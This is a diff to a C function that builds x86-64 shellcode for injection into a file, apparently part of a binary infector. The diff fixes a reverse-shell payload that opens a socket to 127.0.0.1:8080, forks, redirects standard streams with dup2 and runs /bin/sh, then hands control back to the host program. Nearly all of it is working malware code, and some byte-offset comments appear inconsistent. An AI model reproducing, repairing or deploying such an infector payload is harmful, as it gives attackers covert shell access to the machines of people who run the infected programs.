@@ -138,10 +138,10 @@ int add_payload_64(unsigned char *file, size_t size_file, int fd) {
 
         // socket(AF_INET, SOCK_STREAM, 0)
         0x48, 0x31, 0xc0,                           // xor rax, rax
-        0x48, 0xc7, 0xc7, 0x29, 0x00, 0x00, 0x00,   // mov rdi, 41
-        0x48, 0xc7, 0xc6, 0x02, 0x00, 0x00, 0x00,   // mov rsi, 2
-        0xba, 0x00, 0x00, 0x00, 0x00,               // mov edx, 0
-        0xb8, 0x29, 0x00, 0x00, 0x00,               // mov eax, 41
+        0x48, 0xc7, 0xc7, 0x02, 0x00, 0x00, 0x00,   // mov rdi, 2        ; AF_INET
+        0x48, 0xc7, 0xc6, 0x01, 0x00, 0x00, 0x00,   // mov rsi, 1        ; SOCK_STREAM
+        0xba, 0x00, 0x00, 0x00, 0x00,               // mov edx, 0        ; protocol
+        0xb8, 0x29, 0x00, 0x00, 0x00,               // mov eax, 41       ; syscall number
         0x0f, 0x05,                                 // syscall
         // 29 - 33
 
@@ -149,7 +149,7 @@ int add_payload_64(unsigned char *file, size_t size_file, int fd) {
         // 3 - 36
 
         // mprotect
-        0x4c, 0x8d, 0x15, 0xf2, 0x00, 0x00, 0x00,               // lea r10, [rip + 242]
+        0x4c, 0x8d, 0x15, 0x0a, 0x01, 0x00, 0x00,               // lea r10, [rip + 266]
         0x4c, 0x89, 0xd7,                                       // mov rdi, r10
         0x48, 0x81, 0xe7, 0x00, 0xf0, 0xff, 0xff,               // and rdi, 0xfffffffffffff000
         0x48, 0xc7, 0xc6, 0x00, 0x10, 0x00, 0x00,               // mov rsi, 0x1000
@@ -161,8 +161,8 @@ int add_payload_64(unsigned char *file, size_t size_file, int fd) {
         // create value struct sockaddr
         0x48, 0x31, 0xd2,                                   // xor rdx, rdx
         0x66, 0x41, 0xC7, 0x02, 0x02, 0x00,                 // mov word [r10], 0x2
-        0x66, 0x41, 0xC7, 0x42, 0x02, 0x90, 0x1F,           // mov word [r10+2], 0x1F90 => Port 8080
-        0x41, 0xC7, 0x42, 0x04, 0x01, 0x00, 0x00, 0x7f,     // mov dword [r10+4], 0x7f000001 => addr ip 127.0.0.1 
+        0x66, 0x41, 0xC7, 0x42, 0x02, 0x1F, 0x90,           // mov word [r10+2], 0x1F90 -> 8080
+        0x41, 0xC7, 0x42, 0x04, 0x7f, 0x00, 0x00, 0x01,     // mov dword [r10+4], 0x7f000001 => addr ip 127.0.0.1 
         0x48, 0x31, 0xC0,                                   // xor rax, rax
         0x49, 0x31, 0x42, 0x08,                             // xor [r10+8], rax
         // 31 - 105
@@ -182,7 +182,7 @@ int add_payload_64(unsigned char *file, size_t size_file, int fd) {
 
         // si enfant -> rax = 0
         0x48, 0x85, 0xc0,                               // test rax, rax
-        0x0f, 0x85, 0x5a, 0x00, 0x00, 0x00,             // jne on saute de 90
+        0x0f, 0x85, 0x72, 0x00, 0x00, 0x00,             // jne on saute de 114
         // 9 - 143
 
         // dup2
@@ -192,29 +192,38 @@ int add_payload_64(unsigned char *file, size_t size_file, int fd) {
         0x0f, 0x05,                                     // syscall
         // 19 - 162
 
+        0x48, 0xc7, 0xc0, 0x21, 0x00, 0x00, 0x00,       // mov rax, 33
         0x48, 0xc7, 0xc6, 0x01, 0x00, 0x00, 0x00,       // mov rsi, 1 -> stdout
         0x0f, 0x05,                                     // syscall
-        // 9 - 171
+        // 16 - 178
 
+        0x48, 0xc7, 0xc0, 0x21, 0x00, 0x00, 0x00,       // mov rax, 33
         0x48, 0xc7, 0xc6, 0x02, 0x00, 0x00, 0x00,       // mov rsi, 2 -> stderr
         0x0f, 0x05,                                     // syscall
-        // 9 - 180
+        // 16 - 194
 
-        // execve("/bin/sh", NULL, NULL)
-        0x48, 0x31, 0xd2,                                               // xor rdx, rdx
-        0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,     // mov rbx, 0x68732f6e69622f
-        0x53,                                                           // push rbx
-        0x48, 0x89, 0xe7,                                               // mov rdi, rsp
-        0x48, 0x31, 0xf6,                                               // xor rsi, rsi
-        0xb8, 0x3b, 0x00, 0x00, 0x00,                                   // mov eax, 59
-        0x0f, 0x05,                                                     // syscall
-        // 27 - 207
+        // execve("/bin/sh", [bin/sh, NULL], NULL)
+        0x48,0x31,0xc0,                                     // xor rax, rax
+        0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,  // mov rbx, "/bin/sh"
+        0x50,                                               // push rax (NULL terminator for string)
+        0x53,                                               // push rbx
+        0x48,0x89,0xe7,                                     // mov rdi, rsp (/bin/sh)
+        0x48,0x31,0xc0,                                     // xor rax, rax
+        0x50,                                               // push rax (argv[1] = NULL)
+        0x57,                                               // push rdi (argv[0] = "/bin/sh")
+        0x48,0x89,0xe6,                                     // mov rsi, rsp (argv pointer)
+        0x48,0x31,0xc0,                                     // xor rax, rax
+        0x50,                                               // push rax (envp[0] = NULL)
+        0x48,0x89,0xe2,                                     // mov rdx, rsp (envp pointer)
+        0xb0,0x3b,                                          // mov al, 59 (syscall execve)
+        0x0f,0x05,                                          // syscall
+        // 37 - 190 
 
         // exit(1)
         0x48, 0xc7, 0xc7, 0x01, 0x00, 0x00, 0x00,       // mov rdi, 1
         0xb8, 0x3c, 0x00, 0x00, 0x00,                   // mov eax, 60
         0x0f, 0x05,                                     // syscall
-        // 14 - 221
+        // 14 - 245
 
         0x48, 0x8b, 0x3c, 0x24,                                     // mov    rdi, [rsp]      ; argc
         0x48, 0x8d, 0x74, 0x24, 0x08,                               // lea    rsi, [rsp+8]    ; argv
@@ -231,13 +240,13 @@ int add_payload_64(unsigned char *file, size_t size_file, int fd) {
         0x48, 0x8d, 0x1d, 0x03, 0x00, 0x00, 0x00,                   // lea rbx, [rip + 0x3]
         0x53,                                                       // push rbx
         0xff, 0xd0,                                                 // call rax
-        // 54 - 275
+        // 54 - 299
 
         // --- exit(0) ---
         0x48, 0x31, 0xff,                           // xor rdi, rdi
         0xb8, 0x3c, 0x00, 0x00, 0x00,               // mov eax, 60
         0x0f, 0x05,                                 // syscall
-        // 10 -- 285
+        // 10 -- 309
 
         // stock struct
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
